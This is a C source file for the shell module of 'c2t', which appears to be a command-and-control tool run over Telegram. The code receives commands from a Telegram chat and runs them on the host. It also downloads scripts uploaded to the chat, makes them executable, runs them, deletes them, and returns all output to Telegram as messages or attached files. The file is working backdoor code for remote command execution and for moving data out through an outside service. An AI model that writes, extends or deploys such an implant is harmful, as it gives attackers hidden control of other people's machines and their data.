/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "shell_output.h"
#include "../config/config.h"
#include "../logging/logging.h"
#include "../telegram/telegram.h"

#ifdef _WIN32
#include "../win32/win32_api.h"
#else
#include <sys/stat.h>
#include <unistd.h>
#endif

#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

static void strip_ansi_escapes_in_place(char *str) {
  if (!str)
    return;
  char *src = str;
  char *dst = str;
  while (*src) {
    if ((unsigned char)*src == 0x1B) { /* ESC */
      src++;
      if (*src == '[') {
        src++;
        while (*src && !(*src >= 0x40 && *src <= 0x7E)) {
          src++;
        }
        if (*src)
          src++;
      } else if (*src == ']' || *src == '(' || *src == ')') {
        src++;
        while (*src && *src != 0x07 && (unsigned char)*src != 0x1B) {
          src++;
        }
        if (*src == 0x07)
          src++;
      }
    } else if (*src == '\r' && *(src + 1) == '\n') {
      *dst++ = '\n';
      src += 2;
    } else if (*src == '\r') {
      *dst++ = '\n';
      src++;
    } else {
      *dst++ = *src++;
    }
  }
  *dst = '\0';
}

static void append_escaped_html(char *output, size_t *offset, size_t capacity,
                                const char *input) {
  if (!input || !output || !offset)
    return;
  while (*input && *offset + 6 < capacity) {
    if (*input == '&') {
      memcpy(output + *offset, "&amp;", 5);
      *offset += 5;
    } else if (*input == '<') {
      memcpy(output + *offset, "&lt;", 4);
      *offset += 4;
    } else if (*input == '>') {
      memcpy(output + *offset, "&gt;", 4);
      *offset += 4;
    } else {
      output[(*offset)++] = *input;
    }
    input++;
  }
  output[*offset] = '\0';
}

static int is_all_whitespace(const char *str) {
  if (!str)
    return 1;
  while (*str) {
    if (!isspace((unsigned char)*str))
      return 0;
    str++;
  }
  return 1;
}

int c2t_shell_format_telegram(const char *command,
                              const c2t_shell_result_t *result, char *output,
                              size_t capacity) {
  if (!output || capacity < 128)
    return 0;

  output[0] = '\0';
  size_t offset = 0;

  if (!result || result->execution_error) {
    static const char err_hdr[] = "⚠️ <b>Shell Execution Failed</b>\n<b>Command:</b> <code>";
    memcpy(output, err_hdr, sizeof(err_hdr) - 1);
    offset = sizeof(err_hdr) - 1;
    append_escaped_html(output, &offset, capacity, command ? command : "(null)");
    static const char err_tail[] = "</code>\n<i>Unable to spawn child process or pipeline.</i>";
    size_t t_len = strlen(err_tail);
    if (offset + t_len < capacity) {
      memcpy(output + offset, err_tail, t_len);
      offset += t_len;
    }
    output[offset] = '\0';
    return 1;
  }

  char header[256];
  if (result->timed_out) {
    snprintf(header, sizeof(header),
             "⏱️ <b>Shell Timeout</b> (⏱️ %llu ms)\n<b>Command:</b> <code>",
             (unsigned long long)result->duration_ms);
  } else if (result->exit_code == 0) {
    snprintf(header, sizeof(header),
             "⚡ <b>Shell Output</b> (✅ Exit: 0, ⏱️ %llu ms)\n<b>Command:</b> <code>",
             (unsigned long long)result->duration_ms);
  } else {
    snprintf(header, sizeof(header),
             "⚡ <b>Shell Output</b> (❌ Exit: %d, ⏱️ %llu ms)\n<b>Command:</b> <code>",
             result->exit_code, (unsigned long long)result->duration_ms);
  }

  size_t h_len = strlen(header);
  if (h_len < capacity) {
    memcpy(output, header, h_len);
    offset = h_len;
  }

  append_escaped_html(output, &offset, capacity - 128, command ? command : "");

  static const char cmd_close[] = "</code>\n\n";
  if (offset + sizeof(cmd_close) - 1 < capacity) {
    memcpy(output + offset, cmd_close, sizeof(cmd_close) - 1);
    offset += sizeof(cmd_close) - 1;
  }

  if (!result->output || result->output_len == 0 || is_all_whitespace(result->output)) {
    static const char empty_body[] = "<i>(No output returned)</i>";
    size_t eb_len = strlen(empty_body);
    if (offset + eb_len < capacity) {
      memcpy(output + offset, empty_body, eb_len);
      offset += eb_len;
    }
  } else {
    static const char pre_open[] = "<pre><code class=\"language-shell\">";
    if (offset + sizeof(pre_open) - 1 < capacity) {
      memcpy(output + offset, pre_open, sizeof(pre_open) - 1);
      offset += sizeof(pre_open) - 1;
    }

    append_escaped_html(output, &offset, capacity - 64, result->output);

    static const char pre_close[] = "</code></pre>";
    if (offset + sizeof(pre_close) - 1 < capacity) {
      memcpy(output + offset, pre_close, sizeof(pre_close) - 1);
      offset += sizeof(pre_close) - 1;
    }
  }

  output[offset] = '\0';
  return 1;
}

int c2t_shell_run_and_send(const char *command) {
  if (!command || !*command) {
    return telegram_send_html(
        "⚠️ <b>Usage:</b> <code>/sh &lt;command&gt;</code>\n"
        "<i>Aliases:</i> <code>/cmd</code>, <code>/exec</code>, <code>/shell</code>, <code>/terminal</code>, <code>/run</code>\n"
        "<i>Examples:</i>\n"
        "• <code>/sh whoami</code>\n"
        "• <code>/sh uname -a</code>\n"
        "• <code>/sh ip a || ifconfig</code>\n\n"
        "💡 <i>Tip: Send any script file (e.g. .sh, .bat, .ps1, .py) as a document attachment with caption <code>/run</code> to execute it automatically.</i>");
  }

  c2t_log_info("shell", "Executing shell command: '%s'", command);

  c2t_shell_result_t result;
  int exec_ok = c2t_shell_execute(command, &result, C2T_SHELL_DEFAULT_TIMEOUT_MS);
  if (!exec_ok) {
    c2t_log_error("shell", "Execution failed for command: '%s'", command);
    char err_msg[1024];
    (void)c2t_shell_format_telegram(command, &result, err_msg, sizeof(err_msg));
    c2t_shell_result_free(&result);
    return telegram_send_html(err_msg);
  }

  if (result.output) {
    strip_ansi_escapes_in_place(result.output);
    result.output_len = strlen(result.output);
  }

  int sent = 0;
  /* If output is large (> 3000 bytes), send summary and full output as attached document */
  if (result.output && result.output_len > 3000) {
    char filename[64];
    snprintf(filename, sizeof(filename), "cmd_output_%llu.txt",
             (unsigned long long)time(nullptr));

    char preview[3200];
    char preview_output[2000];
    size_t copy_len = result.output_len < 1800 ? result.output_len : 1800;
    memcpy(preview_output, result.output, copy_len);
    preview_output[copy_len] = '\0';

    c2t_shell_result_t preview_res = result;
    preview_res.output = preview_output;
    preview_res.output_len = copy_len;

    (void)c2t_shell_format_telegram(command, &preview_res, preview, sizeof(preview));

    size_t p_len = strlen(preview);
    static const char doc_note[] = "\n\n📄 <i>(Output truncated. Full output attached as file.)</i>";
    if (p_len + sizeof(doc_note) < sizeof(preview)) {
      memcpy(preview + p_len, doc_note, sizeof(doc_note));
    }

    telegram_send_html(preview);
    sent = telegram_send_file(result.output, result.output_len, "text/plain",
                              filename, nullptr);
  } else {
    char response[3900];
    (void)c2t_shell_format_telegram(command, &result, response, sizeof(response));
    sent = telegram_send_html(response);
  }

  c2t_shell_result_free(&result);
  return sent;
}

int c2t_shell_run_script_file_and_send(const char *script_path, const char *args) {
  if (!script_path || !*script_path) {
    return telegram_send_html(
        "⚠️ <b>Usage:</b> <code>/runfile &lt;script_path&gt; [arguments]</code>\n"
        "<i>Aliases:</i> <code>/execfile</code>, <code>/script</code>\n"
        "<i>Examples:</i>\n"
        "• <code>/runfile /tmp/deploy.sh --verbose</code>\n"
        "• <code>/runfile C:\\scripts\\audit.ps1</code>\n\n"
        "💡 <i>Tip: Send any script file directly as an attachment in this chat with caption <code>/run</code> to upload and execute it.</i>");
  }

  c2t_log_info("shell", "Executing local script file: '%s' args='%s'",
               script_path, args ? args : "");

  char cmd_display[256];
  if (args && *args) {
    snprintf(cmd_display, sizeof(cmd_display), "%s %s", script_path, args);
  } else {
    snprintf(cmd_display, sizeof(cmd_display), "%s", script_path);
  }

  c2t_shell_result_t result;
  int exec_ok = c2t_shell_execute_script_file(script_path, args, &result,
                                             C2T_SHELL_SCRIPT_TIMEOUT_MS);
  if (!exec_ok) {
    c2t_log_error("shell", "Execution failed for script file: '%s'", script_path);
    char err_msg[1024];
    (void)c2t_shell_format_telegram(cmd_display, &result, err_msg, sizeof(err_msg));
    c2t_shell_result_free(&result);
    return telegram_send_html(err_msg);
  }

  if (result.output) {
    strip_ansi_escapes_in_place(result.output);
    result.output_len = strlen(result.output);
  }

  int sent = 0;
  if (result.output && result.output_len > 3000) {
    char filename[64];
    snprintf(filename, sizeof(filename), "script_output_%llu.log",
             (unsigned long long)time(nullptr));

    char preview[3200];
    char preview_output[2000];
    size_t copy_len = result.output_len < 1800 ? result.output_len : 1800;
    memcpy(preview_output, result.output, copy_len);
    preview_output[copy_len] = '\0';

    c2t_shell_result_t preview_res = result;
    preview_res.output = preview_output;
    preview_res.output_len = copy_len;

    (void)c2t_shell_format_telegram(cmd_display, &preview_res, preview, sizeof(preview));

    size_t p_len = strlen(preview);
    static const char doc_note[] = "\n\n📄 <i>(Script output truncated. Full output attached as file.)</i>";
    if (p_len + sizeof(doc_note) < sizeof(preview)) {
      memcpy(preview + p_len, doc_note, sizeof(doc_note));
    }

    telegram_send_html(preview);
    sent = telegram_send_file(result.output, result.output_len, "text/plain",
                              filename, nullptr);
  } else {
    char response[3900];
    (void)c2t_shell_format_telegram(cmd_display, &result, response, sizeof(response));
    sent = telegram_send_html(response);
  }

  c2t_shell_result_free(&result);
  return sent;
}

int c2t_shell_run_uploaded_script(const char *file_id, const char *file_name,
                                  const char *caption) {
  const c2t_config_t *config = c2t_config_get();
  if (!config->telegram_enabled || !config->telegram_bot_token ||
      !config->telegram_chat_id) {
    c2t_log_warning("shell", "Cannot execute uploaded script: Telegram unconfigured");
    return 0;
  }
  if (!file_id || !*file_id) {
    c2t_log_error("shell", "Cannot execute script: file_id is empty");
    return 0;
  }

  char clean_name[128] = {};
  if (file_name && *file_name) {
    size_t j = 0;
    for (size_t i = 0; file_name[i] && j + 1 < sizeof(clean_name); i++) {
      char c = file_name[i];
      if (isalnum((unsigned char)c) || c == '.' || c == '_' || c == '-') {
        clean_name[j++] = c;
      } else {
        clean_name[j++] = '_';
      }
    }
    clean_name[j] = '\0';
  }
  if (!clean_name[0]) {
#ifdef _WIN32
    strncpy(clean_name, "script.bat", sizeof(clean_name) - 1);
#else
    strncpy(clean_name, "script.sh", sizeof(clean_name) - 1);
#endif
  }

  /* Parse script arguments or custom command prefix from caption */
  const char *cap = caption ? caption : "";
  while (isspace((unsigned char)*cap))
    cap++;

  if (strncmp(cap, "/runscript", 10) == 0 && (cap[10] == ' ' || cap[10] == '\0')) cap += 10;
  else if (strncmp(cap, "/execfile", 9) == 0 && (cap[9] == ' ' || cap[9] == '\0')) cap += 9;
  else if (strncmp(cap, "/runfile", 8) == 0 && (cap[8] == ' ' || cap[8] == '\0')) cap += 8;
  else if (strncmp(cap, "/powershell", 11) == 0 && (cap[11] == ' ' || cap[11] == '\0')) cap += 11;
  else if (strncmp(cap, "/terminal", 9) == 0 && (cap[9] == ' ' || cap[9] == '\0')) cap += 9;
  else if (strncmp(cap, "/script", 7) == 0 && (cap[7] == ' ' || cap[7] == '\0')) cap += 7;
  else if (strncmp(cap, "/shell", 6) == 0 && (cap[6] == ' ' || cap[6] == '\0')) cap += 6;
  else if (strncmp(cap, "/bash", 5) == 0 && (cap[5] == ' ' || cap[5] == '\0')) cap += 5;
  else if (strncmp(cap, "/exec", 5) == 0 && (cap[5] == ' ' || cap[5] == '\0')) cap += 5;
  else if (strncmp(cap, "/cmd", 4) == 0 && (cap[4] == ' ' || cap[4] == '\0')) cap += 4;
  else if (strncmp(cap, "/run", 4) == 0 && (cap[4] == ' ' || cap[4] == '\0')) cap += 4;
  else if (strncmp(cap, "/sh", 3) == 0 && (cap[3] == ' ' || cap[3] == '\0')) cap += 3;
  else if (strncmp(cap, "/ps", 3) == 0 && (cap[3] == ' ' || cap[3] == '\0')) cap += 3;
  else if (strncmp(cap, "/py", 3) == 0 && (cap[3] == ' ' || cap[3] == '\0')) cap += 3;

  while (isspace((unsigned char)*cap))
    cap++;

  /* Build unique temp file path */
  char temp_path[512] = {};
  uint64_t ts = (uint64_t)time(nullptr);
  uint32_t r = (uint32_t)rand();

#ifdef _WIN32
  char tmp_dir[MAX_PATH] = {};
  if (g_c2t_win32.GetEnvironmentVariableA) {
    if (g_c2t_win32.GetEnvironmentVariableA("TEMP", tmp_dir, sizeof(tmp_dir)) == 0) {
      strncpy(tmp_dir, ".", sizeof(tmp_dir) - 1);
    }
  } else {
    strncpy(tmp_dir, ".", sizeof(tmp_dir) - 1);
  }
  snprintf(temp_path, sizeof(temp_path), "%s\\c2t_scr_%llu_%u_%s", tmp_dir,
           (unsigned long long)ts, (unsigned int)(r % 10000), clean_name);
#else
  snprintf(temp_path, sizeof(temp_path), "/tmp/c2t_scr_%llu_%u_%s",
           (unsigned long long)ts, (unsigned int)(r % 10000), clean_name);
#endif

  c2t_log_info("shell", "Downloading uploaded script '%s' (file_id: %s) to '%s'...",
               clean_name, file_id, temp_path);

  size_t downloaded_bytes = 0;
  int dl_ok = telegram_download_file(config->telegram_bot_token, file_id,
                                     temp_path, config->telegram_max_file_bytes,
                                     &downloaded_bytes);
  if (!dl_ok) {
    c2t_log_error("shell", "Failed to download uploaded script '%s'", clean_name);
    char err_msg[1024];
    snprintf(err_msg, sizeof(err_msg),
             "❌ <b>Script Download Failed</b>\n\n"
             "• <b>Script:</b> <code>%s</code>\n"
             "• <b>Reason:</b> <i>Unable to download file from Telegram (check bot token and max size limit).</i>",
             clean_name);
    return telegram_send_html(err_msg);
  }

#ifndef _WIN32
  (void)chmod(temp_path, 0700);
#endif

  c2t_log_info("shell", "Executing downloaded script '%s' (%llu bytes) with args='%s'",
               temp_path, (unsigned long long)downloaded_bytes, cap);

  char cmd_display[256];
  if (*cap) {
    snprintf(cmd_display, sizeof(cmd_display), "%s %s", clean_name, cap);
  } else {
    snprintf(cmd_display, sizeof(cmd_display), "%s", clean_name);
  }

  c2t_shell_result_t result;
  int exec_ok = c2t_shell_execute_script_file(temp_path, cap, &result,
                                             C2T_SHELL_SCRIPT_TIMEOUT_MS);

  /* Clean up temporary script file from disk */
  (void)remove(temp_path);

  if (!exec_ok) {
    c2t_log_error("shell", "Execution error for script '%s'", clean_name);
    char err_msg[1024];
    (void)c2t_shell_format_telegram(cmd_display, &result, err_msg, sizeof(err_msg));
    c2t_shell_result_free(&result);
    return telegram_send_html(err_msg);
  }

  /* Strip ANSI color escapes from output for clean Telegram presentation */
  if (result.output) {
    strip_ansi_escapes_in_place(result.output);
    result.output_len = strlen(result.output);
  }

  int sent = 0;
  if (result.output && result.output_len > 3000) {
    char filename[64];
    snprintf(filename, sizeof(filename), "script_output_%llu.log",
             (unsigned long long)time(nullptr));

    char preview[3200];
    char preview_output[2000];
    size_t copy_len = result.output_len < 1800 ? result.output_len : 1800;
    memcpy(preview_output, result.output, copy_len);
    preview_output[copy_len] = '\0';

    c2t_shell_result_t preview_res = result;
    preview_res.output = preview_output;
    preview_res.output_len = copy_len;

    (void)c2t_shell_format_telegram(cmd_display, &preview_res, preview, sizeof(preview));

    size_t p_len = strlen(preview);
    static const char doc_note[] = "\n\n📄 <i>(Script output truncated. Full output attached as file.)</i>";
    if (p_len + sizeof(doc_note) < sizeof(preview)) {
      memcpy(preview + p_len, doc_note, sizeof(doc_note));
    }

    telegram_send_html(preview);
    sent = telegram_send_file(result.output, result.output_len, "text/plain",
                              filename, nullptr);
  } else {
    char response[3900];
    (void)c2t_shell_format_telegram(cmd_display, &result, response, sizeof(response));
    sent = telegram_send_html(response);
  }

  c2t_shell_result_free(&result);
  return sent;
}
